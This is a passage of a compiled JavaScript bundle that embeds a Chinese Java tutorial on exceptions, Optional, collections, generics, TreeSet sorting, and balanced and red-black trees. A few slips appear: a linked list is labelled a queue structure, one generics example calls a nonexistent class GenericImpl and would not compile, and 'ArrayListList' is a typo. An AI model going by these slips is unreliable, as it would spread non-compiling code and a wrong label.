class Student {\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          if(age >= 18 && age <= 25){\n              this.age = age;\n          }else{\n              //当年龄不合法时,产生一个异常\n              throw new RuntimeException("年龄超出了范围");\n          }\n      }\n\n      @Override\n      public String toString() {\n          return "Student{" +\n                  "name=\'" + name + \'\\\'\' +\n                  ", age=" + age +\n                  \'}\';\n      }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class ExceptionDemo12 {\n      public static void main(String[] args) {\n          // 键盘录入学生的姓名和年龄,其中年龄为 18 - 25岁,\n          // 超出这个范围是异常数据不能赋值.需要重新录入,一直录到正确为止。\n\n          Student s = new Student();\n\n          Scanner sc = new Scanner(System.in);\n          System.out.println("请输入姓名");\n          String name = sc.nextLine();\n          s.setName(name);\n         while(true){\n             System.out.println("请输入年龄");\n             String ageStr = sc.nextLine();\n             try {\n                 int age = Integer.parseInt(ageStr);\n                 s.setAge(age);\n                 break;\n             } catch (NumberFormatException e) {\n                 System.out.println("请输入一个整数");\n                 continue;\n             } catch (AgeOutOfBoundsException e) {\n                 System.out.println(e.toString());\n                 System.out.println("请输入一个符合范围的年龄");\n                 continue;\n             }\n             /*if(age >= 18 && age <=25){\n                 s.setAge(age);\n                 break;\n             }else{\n                 System.out.println("请输入符合要求的年龄");\n                 continue;\n             }*/\n         }\n          System.out.println(s);\n\n      }\n  }\n  ```\n\n### 3.10 自定义异常（应用）\n\n+ 自定义异常概述\n\n  当Java中提供的异常不能满足我们的需求时,我们可以自定义异常\n\n+ 实现步骤\n\n  1. 定义异常类\n  2. 写继承关系\n  3. 提供空参构造\n  4. 提供带参构造\n\n+ 代码实现\n\n  异常类\n\n  ```java\n  public class AgeOutOfBoundsException extends RuntimeException {\n      public AgeOutOfBoundsException() {\n      }\n\n      public AgeOutOfBoundsException(String message) {\n          super(message);\n      }\n  }\n  ```\n\n  学生类\n\n  ```java\n  public class Student {\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          if(age >= 18 && age <= 25){\n              this.age = age;\n          }else{\n              //如果Java中提供的异常不能满足我们的需求,我们可以使用自定义的异常\n              throw new AgeOutOfBoundsException("年龄超出了范围");\n          }\n      }\n\n      @Override\n      public String toString() {\n          return "Student{" +\n                  "name=\'" + name + \'\\\'\' +\n                  ", age=" + age +\n                  \'}\';\n      }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class ExceptionDemo12 {\n      public static void main(String[] args) {\n          // 键盘录入学生的姓名和年龄,其中年龄为 18 - 25岁,\n          // 超出这个范围是异常数据不能赋值.需要重新录入,一直录到正确为止。\n\n          Student s = new Student();\n\n          Scanner sc = new Scanner(System.in);\n          System.out.println("请输入姓名");\n          String name = sc.nextLine();\n          s.setName(name);\n         while(true){\n             System.out.println("请输入年龄");\n             String ageStr = sc.nextLine();\n             try {\n                 int age = Integer.parseInt(ageStr);\n                 s.setAge(age);\n                 break;\n             } catch (NumberFormatException e) {\n                 System.out.println("请输入一个整数");\n                 continue;\n             } catch (AgeOutOfBoundsException e) {\n                 System.out.println(e.toString());\n                 System.out.println("请输入一个符合范围的年龄");\n                 continue;\n             }\n             /*if(age >= 18 && age <=25){\n                 s.setAge(age);\n                 break;\n             }else{\n                 System.out.println("请输入符合要求的年龄");\n                 continue;\n             }*/\n         }\n          System.out.println(s);\n\n      }\n  }\n  ```\n\n\n## 4.Optional\n\n### 4.1获取对象(应用)\n\n+ Optional概述\n\n  可能包含或不包含非null值的容器对象\n\n+ 方法介绍\n\n  | 方法名                                      | 说明                                       |\n  | ---------------------------------------- | ---------------------------------------- |\n  | static <T> Optional<T> of(T value)       | 获取一个Optional对象，封装的是非null值的对象             |\n  | static <T> Optional<T> ofNullable(T value) | 获取一个Optional对象，Optional封装的值对象可以是null也可以不是null |\n\n+ 示例代码\n\n  ```java\n  public class OptionalDemo1 {\n      public static void main(String[] args) {\n          //method1();\n\n          //public static <T> Optional<T> ofNullable(T value)\n          //获取一个Optional对象，Optional封装的值对象可以是null也可以不是null\n          //Student s = new Student("zhangsan",23);\n          Student s = null;\n          //ofNullable方法，封装的对象可以是null，也可以不是null。\n          Optional<Student> optional = Optional.ofNullable(s);\n\n          System.out.println(optional);\n      }\n\n      private static void method1() {\n          //static <T> Optional<T> of(T value)    获取一个Optional对象，封装的是非null值的对象\n\n          //Student s = new Student("zhangsan",23);\n          Student s = null;\n          //Optional可以看做是一个容器，里面装了一个引用数据类型的对象。\n          //返回值就是Optional的对象\n          //如果使用of方法，封装的对象如果为空，那么还是会抛出空指针异常\n          Optional<Student> optional1 = Optional.of(s);\n          System.out.println(optional1);\n      }\n  }\n  ```\n\n### 4.2常用方法(应用)\n\n+ 方法介绍\n\n  | 方法名                 | 说明                                   |\n  | ------------------- | ------------------------------------ |\n  | T get()             | 如果存在值,返回值,否则抛出NoSuchElementException |\n  | boolean isPresent() | 如果存在值,则返回true,否则为false               |\n\n+ 示例代码\n\n  ```java\n  public class OptionalDemo2 {\n      public static void main(String[] args) {\n          //get() 如果存在值，返回值，否则抛出NoSuchElementException\n          //public boolean isPresent()    判断Optional所封装的对象是否不为空，如果不为空返回true , 否则返回false\n\n          //Student s = new Student("zhangsan",23);\n          Student s = null;\n          Optional<Student> optional = Optional.ofNullable(s);\n          //如果封装的是一个null，那么通过get方法再次获取会抛出NoSuchElementException。\n          if(optional.isPresent()){\n              Student student = optional.get();\n              System.out.println(student);\n          }else{\n              System.out.println("Optional封装的对象为空");\n          }\n      }\n  }\n  ```\n\n### 4.3处理空指针的方法(应用)\n\n+ 方法介绍\n\n  | 方法名                                      | 说明                               |\n  | ---------------------------------------- | -------------------------------- |\n  | T orElse(T other)                        | 如果不为空,则返回具体的值,否则返回参数中的值          |\n  | T orElseGet(Supplier<? extends T> supplier) | 如果不为空,则返回具体的值,否则返回由括号中函数产生的结果    |\n  | void ifPresent (Consumer<? super T> action) | 如果不为空,则使用该值执行给定的操作,否则不执行任何操作     |\n  | void ifPresentOrElse(Consumer<? super T> action, Runnable emptyAction) | 如果不为空,则使用该值执行给定的操作,否则执行给定的基于空的操作 |\n\n+ 示例代码\n\n  ```java\n  public class OptionalDemo3 {\n      public static void main(String[] args) {\n          //method1();\n\n          //method2();\n          //method3();\n          //method4();\n\n      }\n\n      private static void method4() {\n          //Student s = new Student("zhangsan",23);\n          Student s = null;\n          Optional<Student> optional = Optional.ofNullable(s);\n          //public void ifPresentOrElse(Consumer<? super T> action, Runnable emptyAction)、\n          //如果不为空，则使用该值执行给定的操作，否则执行给定的基于空的操作。\n          optional.ifPresentOrElse(student -> System.out.println(student),\n                  ()->System.out.println("为空了"));\n      }\n\n      private static void method3() {\n          //Student s = new Student("zhangsan",23);\n          Student s = null;\n          Optional<Student> optional = Optional.ofNullable(s);\n          //ifPresent (Consumer<? super T> action)\n          //如果不为空，则使用该值执行给定的操作，否则不执行任何操作\n          optional.ifPresent(student -> System.out.println(student));\n      }\n\n      private static void method2() {\n          Student s = new Student("zhangsan",23);\n          //Student s = null;\n          Optional<Student> optional = Optional.ofNullable(s);\n          //orElseGet(Supplier<? extends T> supplier)\n          //如果不为空，则返回具体的值，否则返回由括号中函数产生的结果\n\n          Student student = optional.orElseGet(()-> new Student("lisi" , 24));\n          System.out.println(student);\n      }\n\n      private static void method1() {\n          //Student s = new Student("zhangsan",23);\n          Student s = null;\n          Optional<Student> optional = Optional.ofNullable(s);\n          //orElse(T other) 如果不为空，则返回具体的值，否则返回参数中的值\n          Student student = optional.orElse(new Student("lisi", 24));\n          System.out.println(student);\n      }\n  }\n  ```\n\n  ​',gn={data:function(){return{MainComponent1:mn,MainComponent2:dn}}},bn=gn,vn=Object(u["a"])(bn,pn,un,!1,null,"3a9ae85e",null),hn=vn.exports,Sn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}}),t("q-markdown",{attrs:{src:n.MainComponent3}})],1)},yn=[],fn='\n\n## 1.Collection集合\n\n### 1.1数组和集合的区别【理解】\n\n+ 相同点\n\n  都是容器,可以存储多个数据\n\n+ 不同点\n\n  + 数组的长度是不可变的,集合的长度是可变的\n\n  + 数组可以存基本数据类型和引用数据类型\n\n    集合只能存引用数据类型,如果要存基本数据类型,需要存对应的包装类\n\n### 1.2集合类体系结构【理解】\n\n![01_集合类体系结构图](./img/java/basics/day16-集合01.img/01_集合类体系结构图.png)\n\n### 1.3Collection 集合概述和使用【应用】\n\n+ Collection集合概述\n\n  + 是单例集合的顶层接口,它表示一组对象,这些对象也称为Collection的元素\n  + JDK 不提供此接口的任何直接实现.它提供更具体的子接口(如Set和List)实现\n\n+ 创建Collection集合的对象\n\n  + 多态的方式\n  + 具体的实现类ArrayList\n\n+ Collection集合常用方法\n\n  | 方法名                        | 说明                |\n  | :------------------------- | :---------------- |\n  | boolean add(E e)           | 添加元素              |\n  | boolean remove(Object o)   | 从集合中移除指定的元素       |\n  | boolean removeIf(Object o) | 根据条件进行移除          |\n  | void   clear()             | 清空集合中的元素          |\n  | boolean contains(Object o) | 判断集合中是否存在指定的元素    |\n  | boolean isEmpty()          | 判断集合是否为空          |\n  | int   size()               | 集合的长度，也就是集合中元素的个数 |\n\n### 1.4Collection集合的遍历【应用】\n\n+ 迭代器介绍\n\n  + 迭代器,集合的专用遍历方式\n  + Iterator<E> iterator(): 返回此集合中元素的迭代器,通过集合对象的iterator()方法得到\n\n+ Iterator中的常用方法\n\n  ​\tboolean hasNext(): 判断当前位置是否有元素可以被取出\n  ​\tE next(): 获取当前位置的元素,将迭代器对象移向下一个索引位置\n\n+ Collection集合的遍历\n\n  ```java\n  public class IteratorDemo1 {\n      public static void main(String[] args) {\n          //创建集合对象\n          Collection<String> c = new ArrayList<>();\n\n          //添加元素\n          c.add("hello");\n          c.add("world");\n          c.add("java");\n          c.add("javaee");\n\n          //Iterator<E> iterator()：返回此集合中元素的迭代器，通过集合的iterator()方法得到\n          Iterator<String> it = c.iterator();\n\n          //用while循环改进元素的判断和获取\n          while (it.hasNext()) {\n              String s = it.next();\n              System.out.println(s);\n          }\n      }\n  }\n  ```\n\n+ 迭代器中删除的方法\n\n  ​\tvoid remove(): 删除迭代器对象当前指向的元素\n\n  ```java\n  public class IteratorDemo2 {\n      public static void main(String[] args) {\n          ArrayList<String> list = new ArrayList<>();\n          list.add("a");\n          list.add("b");\n          list.add("b");\n          list.add("c");\n          list.add("d");\n\n          Iterator<String> it = list.iterator();\n          while(it.hasNext()){\n              String s = it.next();\n              if("b".equals(s)){\n                  //指向谁,那么此时就删除谁.\n                  it.remove();\n              }\n          }\n          System.out.println(list);\n      }\n  }\n  ```\n\n### 1.5增强for循环【应用】\n\n+ 介绍\n\n  + 它是JDK5之后出现的,其内部原理是一个Iterator迭代器\n  + 实现Iterable接口的类才可以使用迭代器和增强for\n  + 简化数组和Collection集合的遍历\n\n+ 格式\n\n  ​\tfor(集合/数组中元素的数据类型 变量名 :  集合/数组名) {\n\n  ​\t\t// 已经将当前遍历到的元素封装到变量中了,直接使用变量即可\n\n  ​\t}\n\n+ 代码\n\n  ```java\n  public class MyCollectonDemo1 {\n      public static void main(String[] args) {\n          ArrayList<String> list =  new ArrayList<>();\n          list.add("a");\n          list.add("b");\n          list.add("c");\n          list.add("d");\n          list.add("e");\n          list.add("f");\n\n          //1,数据类型一定是集合或者数组中元素的类型\n          //2,str仅仅是一个变量名而已,在循环的过程中,依次表示集合或者数组中的每一个元素\n          //3,list就是要遍历的集合或者数组\n          for(String str : list){\n              System.out.println(str);\n          }\n      }\n  }\n  ```\n\n## 2.List集合\n\n### 2.1List集合的概述和特点【记忆】\n\n+ List集合的概述\n  + 有序集合,这里的有序指的是存取顺序\n  + 用户可以精确控制列表中每个元素的插入位置,用户可以通过整数索引访问元素,并搜索列表中的元素\n  + 与Set集合不同,列表通常允许重复的元素\n+ List集合的特点\n  + 存取有序\n  + 可以重复\n  + 有索引\n\n### 2.2List集合的特有方法【应用】\n\n| 方法名                             | 描述                  |\n| ------------------------------- | ------------------- |\n| void add(int index,E   element) | 在此集合中的指定位置插入指定的元素   |\n| E remove(int   index)           | 删除指定索引处的元素，返回被删除的元素 |\n| E set(int index,E   element)    | 修改指定索引处的元素，返回被修改的元素 |\n| E get(int   index)              | 返回指定索引处的元素          |\n\n## 3.数据结构\n\n### 3.1数据结构之栈和队列【记忆】\n\n- 栈结构\n\n  ​\t先进后出\n\n- 队列结构\n\n  ​\t先进先出\n\n### 3.2数据结构之数组和链表【记忆】\n\n- 数组结构\n\n  ​\t查询快、增删慢\n\n- 队列结构\n\n  ​\t查询慢、增删快\n\n## 4.List集合的实现类\n\n### 4.1List集合子类的特点【记忆】\n\n- ArrayList集合\n\n  ​\t底层是数组结构实现，查询快、增删慢\n\n- LinkedList集合\n\n  ​\t底层是链表结构实现，查询慢、增删快\n\n### 4.2LinkedList集合的特有功能【应用】\n\n- 特有方法\n\n  | 方法名                       | 说明               |\n  | ------------------------- | ---------------- |\n  | public void addFirst(E e) | 在该列表开头插入指定的元素    |\n  | public void addLast(E e)  | 将指定的元素追加到此列表的末尾  |\n  | public E getFirst()       | 返回此列表中的第一个元素     |\n  | public   E getLast()      | 返回此列表中的最后一个元素    |\n  | public E removeFirst()    | 从此列表中删除并返回第一个元素  |\n  | public   E removeLast()   | 从此列表中删除并返回最后一个元素 |\n\n## 5.泛型\n\n### 5.1泛型概述【理解】\n\n+ 泛型的介绍\n\n  ​\t泛型是JDK5中引入的特性，它提供了编译时类型安全检测机制\n\n+ 泛型的好处\n\n  1. 把运行时期的问题提前到了编译期间\n  2. 避免了强制类型转换\n\n+ 泛型的定义格式\n\n  + <类型>: 指定一种类型的格式.尖括号里面可以任意书写,一般只写一个字母.例如: <E> <T>\n  + <类型1,类型2…>: 指定多种类型的格式,多种类型之间用逗号隔开.例如: <E,T> <K,V>\n\n### 5.2泛型类【应用】\n\n- 定义格式\n\n  ```java\n  修饰符 class 类名<类型> {  }\n  ```\n\n- 示例代码\n\n  - 泛型类\n\n    ```java\n    public class Generic<T> {\n        private T t;\n\n        public T getT() {\n            return t;\n        }\n\n        public void setT(T t) {\n            this.t = t;\n        }\n    }\n    ```\n\n  - 测试类\n\n    ```java\n    public class GenericDemo1 {\n        public static void main(String[] args) {\n            Generic<String> g1 = new Generic<String>();\n            g1.setT("杨幂");\n            System.out.println(g1.getT());\n\n            Generic<Integer> g2 = new Generic<Integer>();\n            g2.setT(30);\n            System.out.println(g2.getT());\n\n            Generic<Boolean> g3 = new Generic<Boolean>();\n            g3.setT(true);\n            System.out.println(g3.getT());\n        }\n    }\n    ```\n\n### 5.3泛型方法【应用】\n\n- 定义格式\n\n  ```java\n  修饰符 <类型> 返回值类型 方法名(类型 变量名) {  }\n  ```\n\n- 示例代码\n\n  - 带有泛型方法的类\n\n    ```java\n    public class Generic {\n        public <T> void show(T t) {\n            System.out.println(t);\n        }\n    }\n    ```\n\n  - 测试类\n\n    ```java\n    public class GenericDemo2 {\n        public static void main(String[] args) {\n    \t    Generic g = new Generic();\n            g.show("柳岩");\n            g.show(30);\n            g.show(true);\n            g.show(12.34);\n        }\n    }\n    ```\n\n### 5.4泛型接口【应用】\n\n- 定义格式\n\n  ```java\n  修饰符 interface 接口名<类型> {  }\n  ```\n\n- 示例代码\n\n  - 泛型接口\n\n    ```java\n    public interface Generic<T> {\n        void show(T t);\n    }\n    ```\n\n  - 泛型接口实现类1\n\n    ​\t定义实现类时,定义和接口相同泛型,创建实现类对象时明确泛型的具体类型\n\n    ```java\n    public class GenericImpl1<T> implements Generic<T> {\n        @Override\n        public void show(T t) {\n            System.out.println(t);\n        }\n    }\n    ```\n\n  - 泛型接口实现类2\n\n    ​\t定义实现类时,直接明确泛型的具体类型\n\n    ```java\n    public class GenericImpl2 implements Generic<Integer>{\n         @Override\n         public void show(Integer t) {\n              System.out.println(t);\n         }\n    }\n    ```\n\n  - 测试类\n\n    ```java\n    public class GenericDemo3 {\n        public static void main(String[] args) {\n            GenericImpl1<String> g1 = new GenericImpl<String>();\n            g1.show("林青霞");\n            GenericImpl1<Integer> g2 = new GenericImpl<Integer>();\n            g2.show(30);\n          \n            GenericImpl2 g3 = new GenericImpl2();\n          \tg3.show(10);\n        }\n    }\n\n    ```\n\n### 5.5类型通配符\n\n- 类型通配符: <?>\n\n  - ArrayList<?>: 表示元素类型未知的ArrayList,它的元素可以匹配任何的类型\n  - 但是并不能把元素添加到ArrayList中了,获取出来的也是父类类型\n\n- 类型通配符上限: <? extends 类型>\n\n  - ArrayListList <? extends Number>: 它表示的类型是Number或者其子类型\n\n- 类型通配符下限: <? super 类型>\n\n  - ArrayListList <? super Number>: 它表示的类型是Number或者其父类型\n\n- 泛型通配符的使用\n\n  ```java\n  public class GenericDemo4 {\n      public static void main(String[] args) {\n          ArrayList<Integer> list1 = new ArrayList<>();\n          ArrayList<String> list2 = new ArrayList<>();\n          ArrayList<Number> list3 = new ArrayList<>();\n          ArrayList<Object> list4 = new ArrayList<>();\n\n          method(list1);\n          method(list2);\n          method(list3);\n          method(list4);\n\n          getElement1(list1);\n          getElement1(list2);//报错\n          getElement1(list3);\n          getElement1(list4);//报错\n\n          getElement2(list1);//报错\n          getElement2(list2);//报错\n          getElement2(list3);\n          getElement2(list4);\n      }\n    \n      // 泛型通配符: 此时的泛型?,可以是任意类型\n      public static void method(ArrayList<?> list){}\n      // 泛型的上限: 此时的泛型?,必须是Number类型或者Number类型的子类\n      public static void getElement1(ArrayList<? extends Number> list){}\n      // 泛型的下限: 此时的泛型?,必须是Number类型或者Number类型的父类\n      public static void getElement2(ArrayList<? super Number> list){}\n\n  }\n  ```\n\n\n\n',_n='## 1.Set集合\n\n### 1.1Set集合概述和特点【应用】\n\n+ 不可以存储重复元素\n+ 没有索引,不能使用普通for循环遍历\n\n### 1.2Set集合的使用【应用】\n\n存储字符串并遍历\n\n```java\npublic class MySet1 {\n    public static void main(String[] args) {\n      \t//创建集合对象\n        Set<String> set = new TreeSet<>();\n      \t//添加元素\n        set.add("ccc");\n        set.add("aaa");\n        set.add("aaa");\n        set.add("bbb");\n\n//        for (int i = 0; i < set.size(); i++) {\n//            //Set集合是没有索引的，所以不能使用通过索引获取元素的方法\n//        }\n      \n      \t//遍历集合\n        Iterator<String> it = set.iterator();\n        while (it.hasNext()){\n            String s = it.next();\n            System.out.println(s);\n        }\n        System.out.println("-----------------------------------");\n        for (String s : set) {\n            System.out.println(s);\n        }\n    }\n}\n```\n\n## 2.TreeSet集合\n\n### 2.1TreeSet集合概述和特点【应用】\n\n+ 不可以存储重复元素\n+ 没有索引\n+ 可以将元素按照规则进行排序\n  + TreeSet()：根据其元素的自然排序进行排序\n  + TreeSet(Comparator comparator) ：根据指定的比较器进行排序\n\n### 2.2TreeSet集合基本使用【应用】\n\n存储Integer类型的整数并遍历\n\n```java\npublic class TreeSetDemo01 {\n    public static void main(String[] args) {\n        //创建集合对象\n        TreeSet<Integer> ts = new TreeSet<Integer>();\n\n        //添加元素\n        ts.add(10);\n        ts.add(40);\n        ts.add(30);\n        ts.add(50);\n        ts.add(20);\n\n        ts.add(30);\n\n        //遍历集合\n        for(Integer i : ts) {\n            System.out.println(i);\n        }\n    }\n}\n```\n\n### 2.3自然排序Comparable的使用【应用】\n\n- 案例需求\n\n  - 存储学生对象并遍历，创建TreeSet集合使用无参构造方法\n  - 要求：按照年龄从小到大排序，年龄相同时，按照姓名的字母顺序排序\n\n- 实现步骤\n\n  1. 使用空参构造创建TreeSet集合\n     + 用TreeSet集合存储自定义对象，无参构造方法使用的是自然排序对元素进行排序的\n  2. 自定义的Student类实现Comparable接口\n     + 自然排序，就是让元素所属的类实现Comparable接口，重写compareTo(T o)方法\n  3. 重写接口中的compareTo方法\n     + 重写方法时，一定要注意排序规则必须按照要求的主要条件和次要条件来写\n\n- 代码实现\n\n  学生类\n\n  ```java\n  public class Student implements Comparable<Student>{\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n\n      @Override\n      public String toString() {\n          return "Student{" +\n                  "name=\'" + name + \'\\\'\' +\n                  ", age=" + age +\n                  \'}\';\n      }\n\n      @Override\n      public int compareTo(Student o) {\n          //按照对象的年龄进行排序\n          //主要判断条件: 按照年龄从小到大排序\n          int result = this.age - o.age;\n          //次要判断条件: 年龄相同时，按照姓名的字母顺序排序\n          result = result == 0 ? this.name.compareTo(o.getName()) : result;\n          return result;\n      }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class MyTreeSet2 {\n      public static void main(String[] args) {\n          //创建集合对象\n          TreeSet<Student> ts = new TreeSet<>();\n  \t    //创建学生对象\n          Student s1 = new Student("zhangsan",28);\n          Student s2 = new Student("lisi",27);\n          Student s3 = new Student("wangwu",29);\n          Student s4 = new Student("zhaoliu",28);\n          Student s5 = new Student("qianqi",30);\n  \t\t//把学生添加到集合\n          ts.add(s1);\n          ts.add(s2);\n          ts.add(s3);\n          ts.add(s4);\n          ts.add(s5);\n  \t\t//遍历集合\n          for (Student student : ts) {\n              System.out.println(student);\n          }\n      }\n  }\n  ```\n\n### 2.4比较器排序Comparator的使用【应用】\n\n- 案例需求\n\n  - 存储老师对象并遍历，创建TreeSet集合使用带参构造方法\n  - 要求：按照年龄从小到大排序，年龄相同时，按照姓名的字母顺序排序\n\n- 实现步骤\n\n  - 用TreeSet集合存储自定义对象，带参构造方法使用的是比较器排序对元素进行排序的\n  - 比较器排序，就是让集合构造方法接收Comparator的实现类对象，重写compare(T o1,T o2)方法\n  - 重写方法时，一定要注意排序规则必须按照要求的主要条件和次要条件来写\n\n- 代码实现\n\n  老师类\n\n  ```java\n  public class Teacher {\n      private String name;\n      private int age;\n\n      public Teacher() {\n      }\n\n      public Teacher(String name, int age) {\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n\n      @Override\n      public String toString() {\n          return "Teacher{" +\n                  "name=\'" + name + \'\\\'\' +\n                  ", age=" + age +\n                  \'}\';\n      }\n  }\n  ```\n\n  测试类\n\n  ```java\n  public class MyTreeSet4 {\n      public static void main(String[] args) {\n        \t//创建集合对象\n          TreeSet<Teacher> ts = new TreeSet<>(new Comparator<Teacher>() {\n              @Override\n              public int compare(Teacher o1, Teacher o2) {\n                  //o1表示现在要存入的那个元素\n                  //o2表示已经存入到集合中的元素\n                \n                  //主要条件\n                  int result = o1.getAge() - o2.getAge();\n                  //次要条件\n                  result = result == 0 ? o1.getName().compareTo(o2.getName()) : result;\n                  return result;\n              }\n          });\n  \t\t//创建老师对象\n          Teacher t1 = new Teacher("zhangsan",23);\n          Teacher t2 = new Teacher("lisi",22);\n          Teacher t3 = new Teacher("wangwu",24);\n          Teacher t4 = new Teacher("zhaoliu",24);\n  \t\t//把老师添加到集合\n          ts.add(t1);\n          ts.add(t2);\n          ts.add(t3);\n          ts.add(t4);\n  \t\t//遍历集合\n          for (Teacher teacher : ts) {\n              System.out.println(teacher);\n          }\n      }\n  }\n  ```\n\n### 2.4两种比较方式总结【理解】\n\n+ 两种比较方式小结\n  + 自然排序: 自定义类实现Comparable接口,重写compareTo方法,根据返回值进行排序\n  + 比较器排序: 创建TreeSet对象的时候传递Comparator的实现类对象,重写compare方法,根据返回值进行排序\n  + 在使用的时候,默认使用自然排序,当自然排序不满足现在的需求时,必须使用比较器排序\n+ 两种方式中关于返回值的规则\n  + 如果返回值为负数，表示当前存入的元素是较小值，存左边\n  + 如果返回值为0，表示当前存入的元素跟集合中元素重复了，不存\n  + 如果返回值为正数，表示当前存入的元素是较大值，存右边\n\n## 3.数据结构\n\n### 3.1二叉树【理解】\n\n+ 二叉树的特点\n\n  + 二叉树中,任意一个节点的度要小于等于2\n    + 节点: 在树结构中,每一个元素称之为节点\n    + 度: 每一个节点的子节点数量称之为度\n\n+ 二叉树结构图\n\n  ![01_二叉树结构图](./img/java/basics/day17-集合02.img/01_二叉树结构图.png)\n\n### 3.2二叉查找树【理解】\n\n+ 二叉查找树的特点\n\n  + 二叉查找树,又称二叉排序树或者二叉搜索树\n  + 每一个节点上最多有两个子节点\n  + 左子树上所有节点的值都小于根节点的值\n  + 右子树上所有节点的值都大于根节点的值\n\n+ 二叉查找树结构图\n\n  ![02_二叉查找树结构图](./img/java/basics/day17-集合02.img/02_二叉查找树结构图.png)\n\n+ 二叉查找树和二叉树对比结构图\n\n  ![03_二叉查找树和二叉树对比结构图](./img/java/basics/day17-集合02.img/03_二叉查找树和二叉树对比结构图.png)\n\n+ 二叉查找树添加节点规则\n\n  + 小的存左边\n  + 大的存右边\n  + 一样的不存\n\n  ![04_二叉查找树添加节点规则](./img/java/basics/day17-集合02.img/04_二叉查找树添加节点规则.png)\n\n### 3.3平衡二叉树【理解】\n\n+ 平衡二叉树的特点\n\n  + 二叉树左右两个子树的高度差不超过1\n  + 任意节点的左右两个子树都是一颗平衡二叉树\n\n+ 平衡二叉树旋转\n\n  + 旋转触发时机\n\n    + 当添加一个节点之后,该树不再是一颗平衡二叉树\n\n  + 左旋\n\n    + 就是将根节点的右侧往左拉,原先的右子节点变成新的父节点,并把多余的左子节点出让,给已经降级的根节点当右子节点\n\n    ![05_平衡二叉树左旋01](./img/java/basics/day17-集合02.img/05_平衡二叉树左旋01.png)\n\n    ![05_平衡二叉树左旋02](./img/java/basics/day17-集合02.img/05_平衡二叉树左旋02.png)\n\n  + 右旋\n\n    + 就是将根节点的左侧往右拉,左子节点变成了新的父节点,并把多余的右子节点出让,给已经降级根节点当左子节点\n\n      ![06_平衡二叉树右旋01](./img/java/basics/day17-集合02.img/06_平衡二叉树右旋01.png)\n\n      ![06_平衡二叉树右旋02](./img/java/basics/day17-集合02.img/06_平衡二叉树右旋02.png)\n\n+ 平衡二叉树和二叉查找树对比结构图\n\n  ![07_平衡二叉树和二叉查找树对比结构图](./img/java/basics/day17-集合02.img/07_平衡二叉树和二叉查找树对比结构图.png)\n\n+ 平衡二叉树旋转的四种情况\n\n  + 左左\n\n    + 左左: 当根节点左子树的左子树有节点插入,导致二叉树不平衡\n\n    + 如何旋转: 直接对整体进行右旋即可\n\n      ![08_平衡二叉树左左](./img/java/basics/day17-集合02.img/08_平衡二叉树左左.png)\n\n  + 左右\n\n    + 左右: 当根节点左子树的右子树有节点插入,导致二叉树不平衡\n\n    + 如何旋转: 先在左子树对应的节点位置进行左旋,在对整体进行右旋\n\n      ![09_平衡二叉树左右](./img/java/basics/day17-集合02.img/09_平衡二叉树左右.png)\n\n  + 右右\n\n    + 右右: 当根节点右子树的右子树有节点插入,导致二叉树不平衡\n\n    + 如何旋转: 直接对整体进行左旋即可\n\n      ![10_平衡二叉树右右](./img/java/basics/day17-集合02.img/10_平衡二叉树右右.png)\n\n  + 右左\n\n    + 右左:当根节点右子树的左子树有节点插入,导致二叉树不平衡\n\n    + 如何旋转: 先在右子树对应的节点位置进行右旋,在对整体进行左旋\n\n      ![11_平衡二叉树右左](./img/java/basics/day17-集合02.img/11_平衡二叉树右左.png)\n\n### 3.4红黑树【理解】\n\n+ 红黑树的特点\n\n  + 平衡二叉B树\n  + 每一个节点可以是红或者黑\n  + 红黑树不是高度平衡的,它的平衡是通过"自己的红黑规则"进行实现的\n\n+ 红黑树的红黑规则有哪些\n\n  1. 每一个节点或是红色的,或者是黑色的\n\n  2. 根节点必须是黑色\n\n  3. 如果一个节点没有子节点或者父节点,则该节点相应的指针属性值为Nil,这些Nil视为叶节点,每个叶节点(Nil)是黑色的\n\n  4. 如果某一个节点是红色,那么它的子节点必须是黑色(不能出现两个红色节点相连 的情况)\n\n  5. 对每一个节点,从该节点到其所有后代叶节点的简单路径上,均包含相同数目的黑色节点\n\n     ![12_红黑树结构图](./img/java/basics/day17-集合02.img/12_红黑树结构图.png)\n\n+ 红黑树添加节点的默认颜色\n\n  + 添加节点时,默认为红色,效率高\n\n    ![13_红黑树添加节点颜色](./img/java/basics/day17-集合02.img/13_红黑树添加节点颜色.png)\n\n+ 红黑树添加节点后如何保持红黑规则\n\n  + 根节点位置\n    + 直接变为黑色\n  + 非根节点位置\n    + 父节点为黑色\n      + 不需要任何操作,默认红色即可\n    + 父节点为红色\n      + 叔叔节点为红色\n        1. 将"父节点"设为黑色,将"叔叔节点"设为黑色\n        2. 将"祖父节点"设为红色\n        3. 如果"祖父节点"为根节点,则将根节点再次变成黑色\n      + 叔叔节点为黑色\n        1. 将"父节点"设为黑色\n        2. 将"祖父节点"设为红色\n        3. 以"祖父节点"为支点进行旋转\n\n### 3.5成绩排序案例【应用】\n\n- 案例需求\n\n  - 用TreeSet集合存储多个学生信息(姓名,语文成绩,数学成绩,英语成绩),并遍历该集合\n  - 要求: 按照总分从高到低出现\n\n- 代码实现\n\n  学生类\n\n  ```java\n  public class Student implements Comparable<Student> {\n      private String name;\n      private int chinese;\n      private int math;\n      private int english;\n\n      public Student() {\n      